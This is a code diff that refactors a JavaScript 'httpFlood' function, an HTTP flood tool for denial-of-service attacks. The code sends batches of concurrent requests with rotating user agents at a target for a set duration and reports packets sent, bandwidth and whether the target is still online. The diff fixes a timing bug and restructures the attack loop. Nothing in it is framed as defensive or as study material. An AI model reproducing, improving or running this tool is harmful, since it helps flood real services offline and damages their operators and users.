@@ -27,25 +27,21 @@ async function httpFlood(target, duration, intensity, updateStatsCallback) {
       controller.abort();
       targetStatus = 'Timeout';
       running = false;
-      console.warn("Request timed out");
       updateStatsCallback({
-        packetsSent: packetsSent,
-        targetStatus: targetStatus,
+        packetsSent,
+        targetStatus,
         mbps: mbps.toFixed(2),
-        elapsedTime: (Date.now() - startTime / 1000).toFixed(2)
-      })
-    }, 15000);
+        elapsedTime: ((Date.now() - startTime) / 1000).toFixed(2)
+      });
+    }, duration * 1000);
 
-    while (running && Date.now() - startTime < duration * 1000) {
-      if (controller.signal.aborted) break;
+    async function sendRequest() {
+      if (!running || controller.signal.aborted) return;
 
-      const promises = [];
-      for (let i = 0; i < intensity; i++) {
-        if (controller.signal.aborted) break;
+      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
-        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-
-        const promise = fetch(target, {
+      try {
+        const response = await fetch(target, {
           method: 'GET',
           headers: {
             'User-Agent': userAgent,
@@ -55,46 +51,52 @@ async function httpFlood(target, duration, intensity, updateStatsCallback) {
           },
           mode: 'no-cors',
           signal: controller.signal,
-        })
-          .then(response => {
-            packetsSent++;
-            if (response.ok) {
-              const contentLength = response.headers.get('content-length');
-              if (contentLength) {
-                mbps += parseFloat(contentLength) / 1000000;
-              }
-              targetStatus = 'Online';
-            } else {
-              targetStatus = 'Unresponsive';
-              console.warn(`Request failed with status: ${response.status}`);
-            }
-          })
-          .catch(error => {
-            if (error.name === 'AbortError') {
-              // Timeout, handled above
-            } else {
-              targetStatus = 'Offline';
-              console.warn("Request failed:", error);
-            }
-          });
-        promises.push(promise);
-      }
-
-      await Promise.all(promises);
-      await new Promise(resolve => setTimeout(resolve, interval));
-
-      const elapsedTime = (Date.now() - startTime) / 1000;
-      const currentMbps = (mbps * 8) / elapsedTime;
-
-      if (updateStatsCallback) {
-        updateStatsCallback({
-          packetsSent: packetsSent,
-          targetStatus: targetStatus,
-          mbps: currentMbps.toFixed(2),
-          elapsedTime: elapsedTime.toFixed(2)
         });
+
+        packetsSent++;
+        if (response.ok) {
+          const contentLength = response.headers.get('content-length');
+          if (contentLength) {
+            mbps += parseFloat(contentLength) / 1000000;
+          }
+          targetStatus = 'Online';
+        } else {
+          targetStatus = 'Unresponsive';
+          console.warn(`Request failed with status: ${response.status}`);
+        }
+      } catch (error) {
+        if (error.name === 'AbortError') {
+        } else {
+          targetStatus = 'Offline';
+          console.warn("Request failed:", error);
+        }
+      } finally {
+        const elapsedTime = (Date.now() - startTime) / 1000;
+        const currentMbps = (mbps * 8) / elapsedTime;
+        if (updateStatsCallback) {
+          updateStatsCallback({
+            packetsSent,
+            targetStatus,
+            mbps: currentMbps.toFixed(2),
+            elapsedTime: elapsedTime.toFixed(2)
+          });
+        }
       }
     }
+
+    async function attackLoop() {
+      while (running && Date.now() - startTime < duration * 1000) {
+        const promises = [];
+        for (let i = 0; i < intensity; i++) {
+          promises.push(sendRequest());
+        }
+        await Promise.all(promises);
+        await new Promise(resolve => setTimeout(resolve, interval));
+      }
+    }
+
+    await attackLoop();
+
   } catch (error) {
     console.error("Error in httpFlood:", error);
     targetStatus = 'Offline';
@@ -106,8 +108,8 @@ async function httpFlood(target, duration, intensity, updateStatsCallback) {
     const currentMbps = (mbps * 8) / elapsedTime;
     if (updateStatsCallback) {
       updateStatsCallback({
-        packetsSent: packetsSent,
-        targetStatus: targetStatus,
+        packetsSent,
+        targetStatus,
         mbps: currentMbps.toFixed(2),
         elapsedTime: elapsedTime.toFixed(2)
       });
